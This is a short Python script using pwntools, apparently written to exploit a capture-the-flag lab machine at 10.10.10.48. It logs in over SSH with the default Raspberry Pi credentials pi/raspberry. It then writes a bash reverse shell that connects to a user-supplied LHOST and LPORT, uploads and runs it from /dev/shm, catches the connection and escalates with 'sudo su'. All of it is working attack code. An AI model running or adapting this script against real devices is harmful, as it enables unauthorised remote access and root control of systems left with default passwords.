#!/usr/bin/python3

import os
from pwn import * # pip3 install pwn

# ctrl + c
def ctrl_c(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

username = 'pi'
password = 'raspberry'

lhost=str(input("LHOST: ").strip("\n"))
lport=str(input("LPORT: ").strip("\n"))
os.system("echo -e '#!/bin/bash\nbash -i >& /dev/tcp/"+lhost+"/"+lport+" 0>&1' > revshell.sh")

# Authenticate with SSH and Upload Shell Script
def foothold():    
    shell = ssh(username, '10.10.10.48', password=password, port=22)
    shell.upload(b"./revshell.sh", remote="/dev/shm/revshell.sh")
    terminal = shell.run(b"bash")
    terminal.sendline(b"bash /dev/shm/revshell.sh")
try:
    threading.Thread(target=foothold, args=()).start()
except Exception as e:
    log.error(str(e))
shell = listen(lport, timeout=150).wait_for_connection()
if shell.sock is None:
    sys.exit(1)
else:
    shell.sendline(b"sudo su")
    shell.interactive()